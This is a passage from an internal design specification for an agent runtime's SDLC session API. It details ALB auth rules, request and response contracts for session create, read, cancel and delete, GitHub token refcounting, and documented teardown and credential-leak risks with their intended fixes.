- **There is no caller identity, and none can be added without a second credential.** The ALB is not authenticating anyone here, so nothing is injected and there is nothing to read. That is not a gap to be filled with a header: a header the caller sets itself is a label, and **one shared token carries no per-caller signal at all** (§0.9.1, §A.3). The retained certificate path is the only one on which `X-Amzn-Mtls-Clientcert-Subject` exists, and on that path its **presence is required**, not merely its value checked — because the two listeners share a target group, so its absence is the only evidence a request did not come through the mutual-TLS door.
- **The client is simpler still than the mTLS version.** `internal/runtimeclient` (Task 2.6) reads one secret, parses `{"token": …}`, and sets `Authorization: Bearer <token>` at a **single request chokepoint**. It **refuses construction when no credential is configured** — degrading to an unauthenticated client is the one outcome that must not be possible — and it `TrimSpace`es the token, because a shell redirect picking up a trailing newline is the common mistake and `Bearer <token>\n` is not the token the runtime holds.
- **`sherpa.<customer_subdomain>` on :443 is the same host and port the human surface already uses**, so the reachability question the mTLS design had to answer does not arise: **no non-standard port, no DNS change, no first-ever traffic on an unused port.** The name is public (`frontend.tf:243-255` is the only existing consumer) and a non-VPC Lambda has default internet egress. The base URL is derived at plan time as a pure function of inputs — **not** from `aws_lb.sherpa[0].dns_name`, which is the wrong value to reach for because the ALB's own hostname is not covered by the ACM certificate the listener presents.

Three notes that are contract, not commentary:

- **The priority-8 deny is mandatory, and it is what the old "rule 6" was for.** Verified live: the ALB's default action is `authenticate-cognito` with `OnUnauthenticatedRequest: "authenticate"` followed by **`forward`**. Existing rules are priority 10 (`/v1/workspace/auth`, `redirect` + `authenticate-cognito`) and 20 (`/v1/workspace/*`, `authenticate-cognito` + `forward`). A `/v1/sdlc/*` request that does not match the priority-6 forward falls past both to that default — and an **already-authenticated** browser is **forwarded, not redirected.** The deny turns that into a 403.
- **The allow must be numerically BELOW the deny.** 6 before 8. An allow at 9 or 10 is never reached and produces a 403 on every machine request from a rule that looks correct in the console.
- **`SDLC_RUNTIME_API_BASE` carries NO `/v1/sdlc` suffix.** The Go client owns that prefix, so a base carrying it requests `/v1/sdlc/v1/sdlc/sessions`. This is the one place the two conventions meet, and the Terraform outputs emit the same suffix-free value for that reason.

#### A.2.1 `POST /v1/sdlc/sessions` — create

Request body. Fields marked **NEW** do not exist on `CreateSessionRequest` today (`api.ts:3-13`, which is `{prompt, mode, repoUrl?, branch?, workspacePath?, name?}`).

| Field | Type | Req | New | Notes |
|---|---|---|---|---|
| `mode` | `'plan' \| 'do'` | REQUIRED | no | The existing `SessionCommand` union (`session.ts:2`). `'agent'` is **not** a member — see Phase 0 Task 0.2. |
| `repoUrl` | `string` | REQUIRED | no | HTTPS GitHub URL. Optional in `CreateSessionRequest`; **required for SDLC** — an SDLC session with no repo has nothing to work on, and `runtimeDispatch.buildRuntimeSessionRequest` already throws on a missing `repoUrl` (`:36-38`). |
| `branch` | `string` | OPTIONAL | no | Runtime creates it from `baseBranch` if absent. **Mutually exclusive with `commitSha`** — supplying both is a 400. |
| `commitSha` | `string` | OPTIONAL | **NEW** | Check out this commit instead of the branch tip. QA only (Part 2 §3.5). **HEAD is not detached** — see below. Must be a full 40-char or abbreviated ≥7-char hex sha; `git-checkout.ts:13` exports `isValidCommitSha` — use it. **A checkout that cannot be satisfied is a `400` at create, not a silently-served branch tip.** This is `DEP-P1-10` and it is the only guard that exists: `checkoutCommit` **never throws** (`git-checkout.ts:56-66`) — it returns `false` on an invalid sha or any git failure and the session proceeds against the tip, producing **a review of the wrong code with no error anywhere.** Part 2's Phase 6 has no safe fallback beyond backup assertions, so this validation is load-bearing, not hardening. |
| `baseBranch` | `string` | OPTIONAL | **NEW** | Two meanings, both required by their caller. For a `branch` checkout: the branch point. For a `commitSha` checkout: **the ref to diff against, which the runtime MUST fetch** — a shallow single-branch clone silently cannot compute `git diff origin/<base>...HEAD`. REQUIRED when `commitSha` is set. |
| `name` | `string` | OPTIONAL | no | `<= 50` (`SESSION_NAME_MAX_LENGTH`). Validate with `session-utils.validateSessionName`. Over-length is a 400, not a silent truncation. |
| `instructions` | `string` | OPTIONAL | **NEW** | The full system prompt, CC-authored. **When present the runtime MUST NOT call `loadSystemPrompt`** (`prompt-loader.ts:79`) and MUST NOT read `KB_BUCKET`/`KB_PREFIX`. The runtime appends only its own tool documentation. When absent, existing behaviour (`loadSystemPrompt`) applies — which keeps the human path unchanged. |
| `model` | `string` | OPTIONAL | **NEW** | A Bedrock model id. **Advisory.** The runtime validates against what it can invoke and falls back to its own default on an unknown/retired/denied id. A fallback MUST emit a Tier-1 `progress` event saying so, and the `model` field of every `CompletionPayload` MUST carry the model **actually used**. A stale model id must never fail a cycle. |
| `prompt` | `string` | REQUIRED | no | The first task message. Non-empty. |
| `profile` | `SdlcSessionProfile` | OPTIONAL | **NEW** | §A.7. Absent ⇒ the interactive/human defaults, unchanged. |
| `resultSchema` | `unknown` | OPTIONAL | **NEW** | §A.5.3. An opaque JSON Schema authored by CC, stored beside `correlation` and `instructions` and run **generically** over `submitPlan`/`submitReview` payloads before publishing. **Absent means forward unvalidated** — which is what lets CC turn the validator off with no runtime deploy. Bounds and the `400` cases are in §A.5.3. |
| `correlation` | `SdlcCorrelation` | OPTIONAL | **NEW** | §A.4.1. **Opaque to the runtime**: stored on the session record, stamped onto every published message, never read, never branched on, **never validated field-by-field**. REQUIRED if the session is to publish events at all — a create with a `profile` but no `correlation` is a 400, because a non-interactive session whose events go nowhere is always a bug. See the courier rule below. |

```ts
// nevado-sherpa-tui: apps/runtime/src/sdlc/contract.ts
export interface SdlcCorrelation {
  readonly applicationId: string;   // REQUIRED, e.g. "app_01H..."
  readonly cycleId: string;         // REQUIRED, e.g. "CYCLE#2026-09-23T14:00:00.000Z"
  readonly stage: string;           // REQUIRED. Deliberately NOT a union — see below.
}
```

**`stage` is deliberately typed `string`, not a closed union, and the runtime must not validate its value.** An earlier draft required the runtime to reject a `stage` outside `{planning, engineering, qa}` with a `400`. That was the runtime branching on an SDLC concept, and it contradicted this document's own boundary assertions two tasks later (Task 2.2's `it('stores correlation verbatim without reading it')`, Task 3.9's `it('echoes the correlation verbatim without reading it')` — *"the runtime is a courier"*). **A courier that rejects mail it cannot read is not a courier.** It also carried BQ3's recurring bill: adding a fourth stage — a deploy-fix session, which Part 2 already contemplates — would have cost an SDK release plus a manual runtime deploy.

**The courier rule, normative.** The runtime validates `correlation` as a **flat object of non-empty string values, at most 16 keys, at most 1 KB serialised**, and nothing else. It stores it, stamps it on every published envelope, and never reads a key. **The `stage`-value check lives in the consumer**, where Task 3.1's `validateEnvelope` already does it correctly and where a new stage is a Command Center deploy.

`stage` is the **coarse progressLog category**, not `cycle.stage`. `cycle.stage` is a separate, finer-grained field whose values include `requirements_expansion`, `awaiting_approval`, `code_generation`, `human_approval`, `qa_execution`, `building`. Do not conflate them; `addProgressLog`'s `stage` argument is the coarse one and that is what `correlation.stage` feeds.

`cycleId` is the DynamoDB **sort key** verbatim, and `applicationId` is the bare id — the partition key is `APP#${applicationId}`. Verified at `index.js:1069-1070`: `PK: \`APP#${applicationId}\``, `SK: cycleId`. The consumer derives both from `correlation` with no read. **If `cycleId` is ever sent without its `CYCLE#` prefix the consumer writes to the wrong key silently.** §A.9 pins this with a test.

Response **`201 Created`** — not `202`. The existing handler returns `201` (`routes/sessions.ts:347`, `:370`) and there is no reason to diverge from it (§0.1.b C20).

```jsonc
{
  "sessionId": "sess_...",            // REQUIRED
  "status": "active" | "queued",      // REQUIRED on the SDLC path, NEW field. See below.
  "workspacePath": "/workspaces/...", // OPTIONAL, diagnostic only. Absent for a queued session.
  "branch": "cycle/12"                // OPTIONAL. See below.
}
```

`CreateSessionResponse` today is `{sessionId?: string, error?: string}` (`api.ts:15-18`). ~~Three added fields, all optional in the type so the human path keeps type-checking (§A.8 P7).~~ **Revision 6: nothing is added to it.** The SDLC response is its own `SdlcCreateSessionResponse` in the runtime's `sdlc/contract.ts`, which is why `status: 'queued'` needs no widening of the persisted `SessionStatus` — it is a **response** field describing admission, not session state.

**`status` is not a field rename — it needs the create path restructured.** Today `POST /sessions` calls `worker.startSession(...)` **without awaiting it** (`sessions.ts:343`, `:366`) and returns `201` immediately, so the handler returns *before* the concurrency gate inside `AgentWorker.startSession` (`agent/worker.ts:134-136`) has been evaluated (§0.1.b C21). To return an honest `status` the runtime must learn the answer synchronously. The cheapest correct shape: have `startSession` reserve the slot (or report that it could not) **before** the first `await`, and expose that decision to the caller — it already reserves synchronously at `worker.ts:134-136` with a deliberate no-`await`-in-between comment, so the information exists; it is just not returned. `worker.activeCount` and `worker.queuedCount` are already exposed (`worker.ts:106-112`) and are what `/health` reports.

**Do not fake it** by comparing `activeCount` to `maxConcurrentSessions` in the route — that is a race, and a wrong `status` is worse than no `status` because CC's stall handling trusts it (Part 2's §3.9 branch treats `'queued'` as "healthy, keep waiting").

Two related defects worth fixing in the same task, because they make `'queued'` a lie in the other direction: the queue is an **in-memory** `Array<() => void>` with no timeout and no depth cap (`worker.ts:41`), so a queued session survives no restart; and `worker.cancelSession` aborts the signal but **does not remove the parked resolver from the queue** (`worker.ts:235-248`), so a cancelled queued session stays parked until a slot frees.

**`branch` for a `commitSha` checkout: return the branch, not null.** The architecture doc says the checkout is detached and `branch` is therefore meaningless. **That is wrong** (§0.1.b C22): the SDK pins a commit with `git fetch --depth 1 origin -- <sha>` then `git reset --hard FETCH_HEAD` and the comment at `git-checkout.ts:30-32` says the detaching alternative was **deliberately rejected** because *"the resumed agent's commits/branch-detection would misbehave."* HEAD stays on the cloned branch and the branch ref moves to the commit. So `branch` is real and must be returned.

**But there is a worse problem on this path that the runtime must fix before QA depends on it:** `checkoutCommit` (`git-checkout.ts:56-66`) **never throws** — it returns `false` on an invalid sha or any git failure, and the session then proceeds against the branch tip. A bad `commitSha` therefore produces a session reviewing **the wrong code, with no error anywhere**. On the SDLC path that must be a hard failure: a `commitSha` that cannot be checked out is a `400` at create time, or the session is created `failed`. Silent-wrong-code is the single worst failure mode available to a review step.

Errors — see §A.2.5 for the envelope:

| Status | When |
|---|---|
| 400 | Missing `mode`/`repoUrl`/`prompt`; `mode` not in `{'plan','do'}`; both `branch` and `commitSha`; `commitSha` without `baseBranch`; `commitSha` not a valid hex sha; `name` over 50; `profile` present without `correlation`; `correlation` missing a field |
| 401 | No/invalid bearer token (returned by API Gateway, never reaches the runtime) |
| 403 | **Two distinct sources, and telling them apart is the first diagnostic step (revision 6).** From the **ALB** — the priority-8 deny, body `{"error":"forbidden"}`, lowercase — the request carried no bearer-shaped `Authorization` header and never reached the instance. From the **runtime** — body `{"error":"Forbidden"}`, capital F — the ACL hook resolved no accepted credential. ~~Caller holds neither `commandcenter/cycles.write` nor `commandcenter/full_access`~~: there is no Cognito scope in this path (§0.9.1) |
| 503 | Runtime is shutting down, or cannot provision a workspace (disk full). Retryable. |

A create that exceeds the concurrency cap is **`201` with `status: 'queued'`**, not `202` and not `429`. The session exists and will run. (An earlier draft said `202` here while specifying `201` eight lines above; `201` is correct and is what Task 2.2's tests assert.)

**There is no `409` on create.** An earlier draft specified one for *"`branch` is already checked out in another live workspace"*, justified by architecture doc §3.8's claim that *"git refuses the same branch in two worktrees."* **The runtime has no worktrees.** Provisioning is one independent shallow clone per session in its own directory — `git clone --depth 1 [-b <branch>] -- <repoUrl> <baseDir>/<sessionId>` (`nevado-sherpa-tui/apps/runtime/src/agent/workspace.ts:33-47`) — and `destroyWorkspace` is `fs.rm(join(baseDir, sessionId), {recursive, force})`. Git's "branch is already checked out" refusal applies to **worktrees of one repository**; two separate clones of the same remote can both have `cycle/12` checked out with no interaction whatsoever. So that `409` specified an error the runtime cannot produce, and an implementer would have built dead code. The only real create-time conflict is disk or concurrency, and that is `503` / `201 queued`.

**This is why the supersede ordering is create-then-release** (§A.2.4), not release-then-create.

##### The GitHub credential must be acquired at create — it is not ambient

**A hard requirement, and the failure mode if it is missed is the worst available.** Verified against the deployed runtime.

`registerSessionRoutes` takes **`tokenManager?: GitHubTokenManager` — optional** (`apps/runtime/src/routes/sessions.ts:177`). `index.ts:115` passes it, but only when it was constructed at `:83-85`, which is itself conditional on `githubAppId`/`githubAppPrivateKeyArn`/`githubAppInstallationId` all being configured. **Nothing forces a route to use it.**

`GitHubTokenManager.acquire(repo)` is what mints the credential (`apps/runtime/src/github-token-manager.ts:23-34`):

- Refcounts per repo: `activeRepos.set(repo, count + 1)`, and **mints only when the previous count was 0**.
- `doRefresh()` mints an installation token scoped to **`Array.from(activeRepos.keys())`** (`:62-66`) — every active repo, not just the caller's.
- Writes `~/.config/gh/hosts.yml` (`:8-9`, `:109`) and schedules a refresh at expiry minus a **10-minute** buffer (`:10`, `:73-78`).
- On a minting failure it **removes the refcount it just added and rethrows** (`:29-32`) — so a failed acquire does not leak a refcount. Good, and worth preserving.

**So if the SDLC create route does not receive `tokenManager` and call `acquire`, the session has no credential — and nothing fails until the agent tries to push.** By then it has planned, edited, run tests and committed. The cycle sees a `reportCompletion` push failure after a full session's wall-clock and tokens, and the cause (a missing constructor argument) is nowhere near the symptom.

**Normative requirements on the create route:**

| # | Requirement |
|---|---|
| 1 | `registerSdlcRoutes` **takes `tokenManager` and it is not optional there.** The runtime-wide construction stays conditional; the SDLC route must refuse to be built without one. An SDLC session exists to commit and push — a route that cannot is not degraded, it is broken. |
| 2 | Call `acquire(extractRepoName(repoUrl))` **before `manager.create`**, guarded by `isGitHubUrl(repoUrl)` — mirroring `sessions.ts:301-302`, which acquires at `:302` and creates at `:305`. |
| 3 | **Pair it with a release on every failure path after the acquire.** The human route's clone-failure arm is the exemplar: `:326-330` releases the token, logs on failure, then `manager.delete`s the session, then returns `400`. **Task 2.3's `commitSha` failure arm must do the same** — it is a new failure path after the acquire and it is the one an implementer will forget. |
| 4 | An `acquire` failure is a **`503`**, not a `500`: it is a transient AWS/Secrets Manager condition and CC's client treats `5xx` as retryable (§A.2.5). Do not create the session first and leave it credential-less. |

**Acceptance check, so the route cannot ship without it** — this is the whole point of writing it down:

```
grep -n "tokenManager" nevado-sherpa-tui/apps/runtime/src/routes/sdlc.ts
```
Expected: the parameter **without** a `?`, an `acquire` call before `manager.create`, and a `release` call on every post-acquire failure arm. Plus a test (Task 2.2) asserting `acquire` was called with the extracted repo name **before** the session was persisted, and a second asserting the release fires when the clone or the `commitSha` pin fails.

**And the end-to-end proof is Task 2.9's smoke script**, which pushes. A route missing the acquire passes every unit test and fails only there — which is exactly why the smoke test commits and pushes rather than stopping at session creation.

#### A.2.2 `GET /v1/sdlc/sessions/{id}` — read the record

**No query parameters.** An earlier draft gave `?include=session` a normative row while also calling it a nice-to-have; those cannot both be true, so it is **out of scope for Part 1** and belongs in a follow-up issue. CC reads `.session` and discards `messages` — correct, and merely wasteful. Do not build it in Phase 2.

**One behaviour of the existing handler that the SDLC path may not want.** `GET /sessions/:id` (`routes/sessions.ts:389-415`) is a wrapper over `manager.resumeSession`, so **it is a resume, not a pure read** — it can settle the ephemeral clone and mutate session state. Part 2's stall handling calls this endpoint on a cycle that has gone quiet, which is precisely the moment a side effect is least wanted. Task 2.2b must establish whether the resume is harmless on a running session and, if it is not, expose a read-only path. **Do not discover this at the stall check.**

Response `200`, `GetSessionResponse` (`api.ts:40-44`) = `{session?: AgentSession, messages?: SessionMessage[], error?: string}`.

The fields of `AgentSession` (`session.ts:63-158`) that the SDLC path depends on, with their exact names — **read these carefully, several differ from what the architecture doc and `runtimeEvents.js` assume**:

| Field | Type | Req | SDLC use |
|---|---|---|---|
| `id` | `string` | REQUIRED | the session id |
| `status` | `SessionStatus` | REQUIRED | the authoritative liveness answer for stall handling |
| `command` | `SessionCommand` | REQUIRED | **the field is `command`, not `mode`.** There is no `mode` on `AgentSession`. `CreateSessionRequest` sends `mode`; the record stores `command`. |
| `filesModified` | `string[]` | REQUIRED | `buildCompletionEffect` maps this to `changes.files` (`runtimeEvents.js:130`) |
| `branch` | `string` | OPTIONAL | `buildCompletionEffect` requires it (`:114`) |
| `commitSha` | `string` | OPTIONAL | `buildCompletionEffect` requires it (`:114`) |
| `totalUsage` | `TokenUsage` | OPTIONAL | `{inputTokens, outputTokens}` only — see §A.4.3 |
| `createdBy` | `string` | OPTIONAL | the ACL key (§A.3) |
| `application` | `SessionApplication` | OPTIONAL | `'sdlc'` after §A.8; the human-visibility filter |
| `turn` | `number` | REQUIRED | monotonic. **Not used as a dedup id** — BQ2 resolved that to a per-envelope UUID |
| `workspacePath` | `string` | OPTIONAL | diagnostic |
| `repoUrl` | `string` | OPTIONAL | |
| `transcript` | `{epoch, bytes, sha256, messageCount?}` | OPTIONAL | diagnostic only |
| `updatedAt` / `createdAt` | `number` (epoch ms) | REQUIRED | **numbers, not ISO strings** — unlike everything on the cycle record |
| `containerHost` | `string` | OPTIONAL | holds a *surface* (`ide`/`tui`/`web`), **not a hostname** |

Also present and not used by the SDLC path: `schemaVersion?`, `userId?`, `name`, `archived?`, `broadcast?`, `lastInputTokens?`, `taskTracker?`, `workspaceType?`, `workspaceName?`, `worktreePath?`, `worktreeBranch?`, `lastAgent?`, `modelOverride?`, `plan?`, `publishState?`, `tombstone?`.

Errors: `404` if the session does not exist **or** the caller's `createdBy` does not match (§A.3 — a mismatch must be indistinguishable from absence, or the endpoint is a session-id oracle).

#### A.2.3 `POST /v1/sdlc/sessions/{id}/cancel`

No body. Response `200` — the existing endpoint's behaviour, unchanged (`nevado-sherpa-tui/apps/runtime/src/routes/sessions.ts:504`; called by the human surface at `sherpa-sdk/packages/web/src/hooks/useSessionManager.ts:394`).

Idempotent: cancelling an already-cancelled or completed session succeeds. Errors: `404` (absent, or not an SDLC session — §A.3).

**⚠ `cancel` does not stop a session that is still queued, and this changes what a termination path may call.** `AgentWorker.cancelSession` (`agent/worker.ts:235-248`) aborts the `AbortController` and sweeps pending approvals. It **does not remove the parked resolver from `queue`** (`worker.ts:41`). A session that hit the capacity gate is parked on a bare promise at `worker.ts:134-136`, and when a slot frees, `startSession`'s `finally` calls `queue.shift()?.()` (`:231`) — **resolving the cancelled session's promise and admitting it into the body of `startSession`.**

So cancelling a cycle whose session is still queued will, minutes later, **start an agent on a cancelled cycle's branch.** Two consequences that are contract:

1. **A cycle-termination path must call `DELETE`, not `cancel`.** `DELETE` cancels *and* removes the session, so there is nothing left for `queue.shift()` to resolve into. `cancel` alone is only safe for a session known to be active.
2. **The fix inside the runtime is to dequeue the parked resolver in `cancelSession`** — Task 2.2's named sub-fix. It is **not** to delete the `activeSessions` entry: `worker.ts:244-246` forbids that explicitly, because that map is the capacity accounting.

Part 2 verified the same behaviour independently. Note its citation reads `sessions.ts:235-248`; the code is in **`agent/worker.ts:235-248`** — `routes/sessions.ts` only calls through to it.

#### A.2.4 `DELETE /v1/sdlc/sessions/{id}` — release the workspace

**This endpoint already exists** (`routes/sessions.ts:417-439`) and does more than the architecture doc credits — see §0.1.a C2 and §0.1.b C24. It already cancels a live session, destroys an ephemeral workspace, and releases the GitHub token. Five things about it do not meet this contract.

What it does today, verbatim behaviour:

1. `manager.get(id)`; if absent → `404 {error: 'Session not found'}` (`:420-422`)
2. if `worker.isSessionActive(id)` → `worker.cancelSession(id)` (`:424-426`)
3. if `session.workspaceType === 'ephemeral'` → `workspaceManager.destroyWorkspace(id)` (`:428-430`), which is `fs.rm(join(baseDir, sessionId), {recursive, force})`
4. if a GitHub repo → `tokenManager.release(extractRepoName(session.repoUrl))`, **best-effort, `try/catch` + `console.error` only** (`:432-435`)
5. `manager.delete(id)` → `200 {ok: true}` (`:437-438`)

The contract, and the five deltas:

| Requirement | Today | Delta |
|---|---|---|
| **Releases the GitHub credential** | `tokenManager.release(repo)` at `sessions.ts:432-435` | **Already present on the human route — the requirement is to preserve it, and to stop it being best-effort.** `release` (`github-token-manager.ts:36-49`) decrements the refcount; when the last repo goes it calls `stopRefresh()` and `deleteHostsFile()`, and **when other repos remain it re-mints a token covering just those** (`:44`). Today the call is wrapped in `try/catch` with a `console.error` — so **a failed release leaks a live push credential, not merely a workspace.** See §A.2.4a. The SDLC route must at minimum log it at error level with the repo name and surface it in the response, rather than returning a clean `200` over a leaked credential. |
| Removes the working tree | **only for `workspaceType === 'ephemeral'`** | SDLC sessions are created with `repoUrl`, which takes the ephemeral arm (`sessions.ts:296`), so this is satisfied *provided* the SDLC path never uses `workspacePath`. **Assert it rather than assume it:** a persistent session's tree is never touched, so a leaked tree is a disk leak that the TTL sweep is the backstop for. There are **no worktrees** anywhere in the runtime — provisioning is clone-only (`agent/workspace.ts:33-47`), so there is no `git worktree remove`/`prune` to do, and no branch-collision to avoid (§A.2.1). |
| Releases the concurrency slot | **asynchronously, after the response** | **Decided: the handler awaits the unwind.** `cancelSession` only aborts the signal; the map delete is deliberately left to `startSession`'s `finally` (`worker.ts:229-232`), so otherwise the slot frees whenever the aborted turn finishes unwinding and `DELETE` returning `200` does not mean a slot is free. Awaiting is also the only fix available: **deleting the map entry inside `cancelSession` is explicitly forbidden by the code**, `worker.ts:244-246` — *"deliberately NOT that method's eager activeAborts delete: here the map is the liveness record behind `isSessionActive` and the capacity accounting, so startSession's `finally` must stay its only owner or a cancel would release a slot the unwinding turn still holds."* An implementer's first instinct is that delete; it would corrupt capacity accounting. Note that under create-then-release (below) this matters less than it did — the new session is already created before the old one is released. |
| Response **`200 {ok: true}`** | `200 {ok: true}` | **Decided: keep `200`.** No change. It matches every other route in the service, CC branches on status class rather than on the body (§A.2.5), and changing it would be a gratuitous divergence from the human route for no gain. An earlier draft left this as *"record whichever you pick"*; it is decided. Part 2's `DEP-P1-1` asked for `204` — see the closing section. |
| **Idempotent** | **No — a second call is `404`** | The `manager.get` precheck at `:420-422` is the only reason; the SDK's own `deleteCore` *is* idempotent (`session-manager.ts:2055`: `if (!session) return;`). **This must be fixed**: the consumer retries, and a retry turning into a failure is how a supersede silently does not happen. Make the SDLC route treat absent-session as success. |
| Behaviour while running | cancels, does not refuse | **Correct as-is, and deliberately different from its siblings** — `POST /sessions/:id/messages` (`:446-448`) and `POST /sessions/:id/broadcast` (`:621-623`) both `409` on an active session; `DELETE` is the one route that yanks a live one. That is what CC wants on supersede and on cycle termination. Keep it. |

**A sixth delta, and it is the one with a live incident behind it: the credential release must stop being silent.**

`release` is what decrements the refcount and, when the last repo goes, calls `stopRefresh()` and `deleteHostsFile()` (`github-token-manager.ts:36-49`). A missed release therefore leaves the refresh timer **re-minting a valid push credential indefinitely** — §A.2.4a documents one currently leaked on the box, re-minted every ~50 minutes for two days. Today the call is `try/catch` + `console.error`, so `DELETE` returns a clean `200` over a leaked credential.

Required on the SDLC route:

- **Log the failure at error level, naming the repo and the session id** — not a bare `console.error('Token release failed…')`. An operator needs to know *which* credential leaked to revoke it.
- **Reflect the failure in the response.** CC's retry-once-then-fail-the-cycle rule (Part 2 `DEP-P1-1`) is built on `releaseSession` throwing; a `200` that hid a leaked credential defeats it.
- **Release the credential even when the workspace destroy fails**, and vice versa — the two are independent and both must be attempted. The existing order (destroy, then release, then `manager.delete`) is fine; do not let an early throw skip a later step.
- **Do not make it conditional on `workspaceType === 'ephemeral'`.** The workspace destroy is (`:428-430`); the credential release is not (`:432`), and must stay that way — a persistent-workspace session still acquired a token.

**Two hazards to fix in the same task, because they are teardown bugs and this is the teardown path:**

- **A resurrection race.** `DELETE` does not await the cancelled turn. `manager.delete` (`:437`) runs concurrently with the unwinding turn, which is still inside `runTurn` and will reach the engine's terminal `pauseSession`/`completeSession` → `store.save(session)`. `FileSessionStore.save` does `sessions.unshift(session)` when the id is absent (`file-session-store.ts:102`), so **the save can resurrect the row the delete just removed.** The result is a released session that still exists, holding nothing — which then fails the next `GET` in a confusing way.
- **`Broadcaster.cleanup` is dead code.** It exists at `ws/broadcaster.ts:81-84` and has **zero callers** — a grep of `apps/runtime/src` for `.cleanup(` finds no production hit. So a 50-message buffer per session (`broadcaster.ts:4`) leaks for the process lifetime; the 5-minute TTL (`:5`) filters reads but never evicts. The SDLC delete path must call it. On a runtime that will now create a session per cycle step rather than per human sitting down, this stops being theoretical.
- Also: `manager.delete` **writes a `deleted` tombstone to S3 before dropping the row locally, and throws if that write fails** (`session-manager.ts:2058-2060`). There is no try/catch around `:437`, so `DELETE` can `500` with the session still live locally. On the SDLC path that surfaces to CC as a release failure, which is correct — but CC's retry-once-then-fail-the-cycle rule (Part 2 `DEP-P1-1`) then depends on the second attempt succeeding, so the S3 failure mode needs a log line that says which half failed.

Errors: `404` **only when the session id was never known**. An already-released id is a success, not a `404`.

#### A.2.4a Two credential risks the design does not fix in v1

Both verified against the deployed runtime. **Record them as accepted, not solved** — pretending otherwise is how the auto-approve allowlist became "evidence the runtime is sandboxed" (architecture doc R2).

##### Risk: shared-token cross-repo exposure

`activeRepos` is **one in-memory `Map`** and `hosts.yml` is **one shared file** (`github-token-manager.ts:14`, `:8-9`). Every `acquire` re-mints a token scoped to `Array.from(activeRepos.keys())` — **all active repos** (`:62-66`).

So **two concurrent sessions on different repositories each hold a credential granting push access to the other's repository.** At the deployed `MAX_CONCURRENT_SESSIONS=10` that is up to ten repositories reachable from any one session. It applies to human sessions today; SDLC sessions do not create it, but they will exercise it far more often, because a machine creates a session per cycle step rather than per human sitting down.

**This is a concrete instance of architecture doc U3** — *"does the runtime server hold per-session state a second concurrent session would clobber?"* — and it is the first confirmed one beyond `prompt-loader.ts`'s cache. U3 should be updated to say so rather than remaining open.

**v1 does not fix it.** Two things reduce exposure without fixing it, and both are worth doing:

- **The ACL (§A.3) is the containment that exists.** It stops a machine caller reading a human session's record and transcript. It does nothing about the token, because the token is a file on disk that every process on the box can read — which is the honest statement and the reason §A.7.4 says containment lives at the host layer.
- **Keep concurrent SDLC sessions on one application where practical.** A cycle's three steps share a repo, so the refcount path is the normal case and no cross-repo token is minted. Cross-repo exposure only arises from concurrent cycles on *different* applications. That is a scheduling preference, not a control — state it as such.

The real fix is per-session credential isolation, which means per-session `HOME` or per-task isolation, i.e. the Fargate migration. Tracked there, not here.

##### Risk: a failed release leaks a live credential, and one is leaked right now

**Observed on the box on 2026-09-24:** `hosts.yml` mtime `13:44 UTC`, `/health` reporting `activeSessions: 0`, and the systemd unit up continuously since `2026-09-22 17:04:58`.

**That combination is proof of a leaked acquisition, not merely a stale file.** `doRefresh()` returns early when `activeRepos` is empty (`github-token-manager.ts:63-64`: `if (repos.length === 0) return;`), so it cannot rewrite `hosts.yml` unless at least one refcount is still held. A rewrite with zero live sessions therefore means an `acquire` was never paired with a `release` — and the refresh timer has been **re-minting a valid push credential every ~50 minutes for two days** (expiry minus the 10-minute buffer, `:10`, `:73-78`).

**So the consequence of a missed release is not an idle workspace. It is a live, self-renewing push credential for every repo in the leaked set, held by a process with no sessions.** Two things follow for this spec:

1. **`DELETE`'s release must not stay best-effort-and-silent.** It is `try/catch` + `console.error` today (`sessions.ts:433-435`). Task 2.5 raises it: log at error level with the repo name, and reflect the failure in the response so CC's retry-once-then-fail-the-cycle rule (Part 2 `DEP-P1-1`) has something to act on.
2. **Corroborating evidence of the same class:** 86 of 89 `/workspaces` directories contain a `.git`, the oldest dated `2026-06-08`. **Nothing sweeps them.** The TTL sweep that architecture doc §3.8 calls "the backstop" does not exist — so release-on-supersede is currently the *only* mechanism, with no safety net. §3.8's framing should be corrected: it describes a backstop as though it were implemented.

##### The good news, and it is the load-bearing half

**The credential path works.** A machine session with no human behind it can clone, commit and push — which was architecture doc §1.3's central unverified assumption and is now confirmed empirically. **The design's division of labour holds: the runtime commits and pushes, Command Center opens the PR.**

**One correction to §1.3's framing.** It describes the credentials as *"host-global, not tied to a human's identity."* The second clause is right and is the part that matters. The first is wrong: acquisition is **per-repo and refcounted**, and the token is scoped to the active set rather than to everything the installation can reach. That is *better* than host-global — and it is also precisely why the cross-repo exposure above exists, since the "active set" is shared rather than per-session. §0.1.c records the correction.

#### Ordering on supersede: create, then release

**Normative, and the reverse of what the architecture doc says.** Architecture doc §3.2 prescribes release-before-create, with a code comment giving the reason: *"The outgoing session holds the branch checked out, and git refuses the same branch in two worktrees."* **That reason is false** — the runtime has no worktrees, only independent clones (§A.2.1), so two live sessions can hold the same branch with no interaction.

With the collision gone, release-first is strictly worse: it destroys the outgoing session's workspace **before** its replacement exists, so a create that then fails — a `503`, a transient network error, a `201 queued` that never starts — leaves the cycle holding neither. Create-then-release has no such window.

So: **create the new session, persist its id, then release the superseded one.** If the release fails, retry once and then fail the cycle with that reason (Part 2 `DEP-P1-1`) — a held workspace is a disk problem the TTL sweep handles, but a silently-skipped release is a leak nobody notices.

**One interaction with the GitHub credential, and it is benign for the common case.** Under create-then-release both sessions are alive briefly, so the incoming `acquire` re-mints a token covering both repos and the outgoing `release` then re-mints covering one.

- **Same repository** — the overwhelmingly common case, since a supersede replaces one session on one cycle's repo: `acquire` merely increments the refcount (`github-token-manager.ts:24-26` mints only when the previous count was 0), so **no re-mint happens at all** and there is no window.
- **Different repositories** — only if a supersede ever crosses applications: there is a brief window where one token covers both. That is a strictly smaller instance of the standing exposure in §A.2.4a, which exists whenever two concurrent sessions touch different repos regardless of ordering. **Note it; do not treat it as created by this ordering choice.**

The one cost, stated: **two workspaces and two concurrency slots exist briefly.** On a runtime at its cap that means the replacement create may come back `201 queued` rather than `201 active`. That is a delay, not a failure, and it is visible (§A.2.1's `status`) — which is better than the old ordering's failure mode of losing both workspaces. And because the slot release is asynchronous anyway (above), release-first never reliably freed a slot in time to help.

**CC calls this, never the runtime.** The reclaim point (supersede, cycle termination) is a cycle concept the runtime has no view of, and teaching it would break the boundary in architecture doc §1.1 for no gain.

#### A.2.5 Error envelope — normative

All four endpoints return errors as:

```jsonc
{ "error": "human-readable message" }
```

